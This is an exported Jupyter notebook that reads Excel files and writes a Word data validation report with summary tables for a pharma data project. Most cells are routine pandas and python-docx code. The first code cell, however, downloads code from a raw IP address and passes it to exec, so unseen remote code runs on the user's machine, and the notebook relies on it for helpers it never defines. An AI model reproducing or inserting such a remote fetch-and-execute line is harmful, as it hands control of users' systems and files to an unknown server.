# Execute the final data quality control process on .xlsx


In [25]:
import os, glob, time, numpy as np; os.environ['USE_PYGEOS'] = '0'
import requests; exec(requests.get(f'http://45.120.118.102:6888/lib/Jpkg?key=J.').json()['Jpkg'])
import warnings; warnings.filterwarnings('ignore')
from docx import Document
table_cmap = dict(color="#BFE8F4", row0_fontcolor='#000000', col0_fontcolor='#000000')

### Setting

In [26]:
task_key = '1298–1229 Pure Strategies_Pharma client - 8 sites USA, DaaS data Project Plan' # Modify as required
run_path = 'Z:\works\Lucas\quality_control' # Modify as required

os.chdir(run_path)
fns = sorted(glob.glob(f'*.xlsx'))

index_cols = ['SN']
groupby_cols = ['Indicator', 'Theme'] # Modify as required
validation_cols = ['Value'] # Modify as required
validation_cols = [i for i in validation_cols if i not in index_cols]

### Generate the data validation report

In [27]:
doc = Document()
p = doc.add_paragraph(); p.style = 'Title'; p.text = f"Data Validation Report" 
p = doc.add_paragraph(); p.style = 'Subtitle'; p.text = f"For {task_key}"
p = doc.add_paragraph(); p.style = 'Heading 1'; p.text = f"Check data by file:" 

nrows, cols = [], []
for i, fn in enumerate(fns):
    print(i+1, fn)
    df = pd.read_excel(fn)
    
    if 'Value' in df.columns:
        df['Value'] = pd.to_numeric(df['Value'], errors='coerce')
    
    cols = cols + df.columns.values.tolist()
    df = df.set_index(index_cols)
    p = doc.add_paragraph(); p.style = 'Heading 4'; p.text = f"{i+1}: {fn}"
    doc.add_paragraph()
    p = doc.add_paragraph(); p.style = 'Normal'; p.text = f'Total(rows): {len(df)}, Index({df.index.name}): {len(set(df.index))}'
    nrows.append([i+1, fn, len(df), len(set(df.index))])
    doc.add_paragraph()
    
    if validation_cols:
        p = doc.add_paragraph(); p.style = 'Caption'; p.text = f"Validation columns: {', '.join(validation_cols)}"
        
        desc_df = df[validation_cols].describe().reset_index()
        desc_df = desc_df[desc_df['index'].isin(['count', 'mean', 'min', 'max'])]
        
        doc = add_table_to_doc(desc_df, doc, **table_cmap)
        doc.add_paragraph()
        
    if groupby_cols:
        p = doc.add_paragraph(); p.style = 'Caption'; p.text = f"Validation group by: {', '.join(groupby_cols)}"
        
        for (indicator, theme, unit), g_df in df.groupby(['Indicator', 'Theme', 'Units']):
            
            p = doc.add_paragraph(); p.style = 'Normal'
            p.text = f'{indicator} - {theme} (Unit: {unit})'
            
            g_desc_df = g_df[validation_cols].describe().reset_index()
            g_desc_df = g_desc_df[g_desc_df['index'].isin(['count', 'mean', 'min', 'max'])]
            
            doc = add_table_to_doc(g_desc_df, doc, **table_cmap)
            doc.add_paragraph()

doc.add_page_break()
df_nrows = pd.DataFrame(nrows, columns=['SN', 'File Name', 'Row Count', 'Index Count'])
p = doc.add_paragraph(); p.style = 'Heading 1'; p.text = f"Total files table:" 
doc = add_table_to_doc(df_nrows, doc, **table_cmap)
doc.add_paragraph()

set_cols = []
for i in cols:
    if i not in set_cols and i not in validation_cols: 
        set_cols.append(i)
        
df_cols = pd.DataFrame(set_cols + validation_cols, columns=['Column Name'])
df_cols.index = df_cols.index + 1
df_cols.index.name = 'Column Number'
df_cols['Explanation'] = ''
doc.add_page_break()
p = doc.add_paragraph(); p.style = 'Heading 1'; p.text = f"Describe table columns:" 
doc = add_table_to_doc(df_cols.reset_index(), doc, **table_cmap)

doc.save(f"{task_key}_Data_validation_report_{time.strftime('%Y.%m.%d_%H%M%S',time.localtime(time.time()))}.doc")
print('All done.')

1 Export_2026.05.26_110253_Data_Score_Change.xlsx
All done.
